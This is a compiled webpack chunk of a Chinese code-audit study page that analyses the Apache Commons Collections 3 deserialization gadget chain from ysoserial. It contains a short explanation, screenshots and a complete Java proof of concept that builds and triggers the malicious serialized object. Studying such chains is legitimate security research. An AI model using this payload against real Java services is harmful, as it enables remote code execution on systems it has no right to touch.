"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[9240],{8453:(e,n,a)=>{a.d(n,{R:()=>o,x:()=>c});var t=a(6540);const s={},r=t.createContext(s);function o(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),t.createElement(r.Provider,{value:n},e.children)}},8764:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>l,contentTitle:()=>c,default:()=>p,frontMatter:()=>o,metadata:()=>t,toc:()=>i});const t=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC3","title":"Apache Commons Collections 3","description":"\u5229\u7528\u94fe\u5206\u6790","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7/03.CC3.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC3","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC3","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7/03.CC3.md","tags":[],"version":"current","sidebarPosition":3,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Apache Commons Collections 2","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC2"},"next":{"title":"Apache Commons Collections 6","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC6"}}');var s=a(4848),r=a(8453);const o={},c="Apache Commons Collections 3",l={},i=[{value:"\u5229\u7528\u94fe\u5206\u6790",id:"\u5229\u7528\u94fe\u5206\u6790",level:2},{value:"CC3\u5229\u7528\u6d41\u7a0b\u56fe",id:"cc3\u5229\u7528\u6d41\u7a0b\u56fe",level:2}];function m(e){const n={code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"apache-commons-collections-3",children:"Apache Commons Collections 3"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5229\u7528\u94fe\u5206\u6790",children:"\u5229\u7528\u94fe\u5206\u6790"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e0ecc1\u4e0d\u540c\u7684\u662f\u5229\u7528\u4e86",(0,s.jsx)(n.code,{children:"InstantiateTransformer"}),"\u4e0e ",(0,s.jsx)(n.code,{children:"TemplatesImpl"})," \u7c7b\u7684\u52a8\u6001\u52a0\u8f7d"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 ",(0,s.jsx)(n.code,{children:"TemplatesImpl.defineTransletClasses()"}),"\u5b8c\u6210\u4e86\u7c7b\u7684\u52a8\u6001\u52a0\u8f7d\uff0c"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211816295.png-1",alt:"image-20230220164450032"})}),"\n",(0,s.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230",(0,s.jsx)(n.code,{children:"defineTransletClasses"})," \u6709\u4e09\u5904\u8c03\u7528 \uff0c\u4e14\u53ea\u6709\u4e00\u5904\u7684\u8c03\u7528\u5904\uff0c\u662f\u88ab\u5176\u4ed6\u7684\u8c03\u7528\u7684 ",(0,s.jsx)(n.code,{children:"getTransletInstance"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211816296.png-1",alt:"image-20230220164821911"})}),"\n",(0,s.jsxs)(n.p,{children:["\u800c",(0,s.jsx)(n.code,{children:"newTransformer"})," \u53ea\u6709 ",(0,s.jsx)(n.code,{children:"TrAXFilter"})," \u8fd9\u4e2a\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4e2d\u6ee1\u8db3\u6761\u4ef6"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211816297.png-1",alt:"image-20230220165015377"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7ed3\u5408",(0,s.jsx)(n.code,{children:"InstantiateTransformer"})," \u5c31\u53ef\u6210\u529f\u8c03\u7528\u94fe\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211816298.png-1",alt:"image-20230220165103295"})}),"\n",(0,s.jsx)(n.p,{children:"\u5b8c\u6574\u7684POC"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-java",children:'package org.example;\n\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\n\npublic class CC3 {\n    public static void main(String[] args) throws Exception {\n        TemplatesImpl templates = new TemplatesImpl();\n        Class<? extends TemplatesImpl> aClass = templates.getClass();\n        Field name = aClass.getDeclaredField("_name");\n        name.setAccessible(true);\n        name.set(templates,"aaaa");\n        Field bytecodes = aClass.getDeclaredField("_bytecodes");\n        bytecodes.setAccessible(true);\n        byte[]code = Files.readAllBytes(Paths.get("C:\\\\Users\\\\wjl\\\\Desktop\\\\CC\\\\target\\\\classes\\\\org\\\\example\\\\Test.class"));\n        byte[][]codes = {code};\n        bytecodes.set(templates,codes);\n        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}),\n        });\n        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();\n        Map<?,?> decorate =  LazyMap.decorate(objectObjectHashMap, chainedTransformer);\n        Class<?> aClass1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\n        Constructor<?> declaredConstructor = aClass1.getDeclaredConstructor(Class.class, Map.class);\n        declaredConstructor.setAccessible(true);\n        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);\n        Map proxyMap= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, o);\n        Object o1 = declaredConstructor.newInstance(Override.class, proxyMap);\n        serialize(o1);\n        unserialize("ser.bin");\n\n    }\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream objectInputStream = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));\n        return objectInputStream.readObject();\n    }\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));\n        objectOutputStream.writeObject(obj);\n    }\n}\n'})}),"\n",(0,s.jsx)(n.h2,{id:"cc3\u5229\u7528\u6d41\u7a0b\u56fe",children:"CC3\u5229\u7528\u6d41\u7a0b\u56fe"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211816299.png-1",alt:"image-20230220171002143"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(m,{...e})}):m(e)}}}]);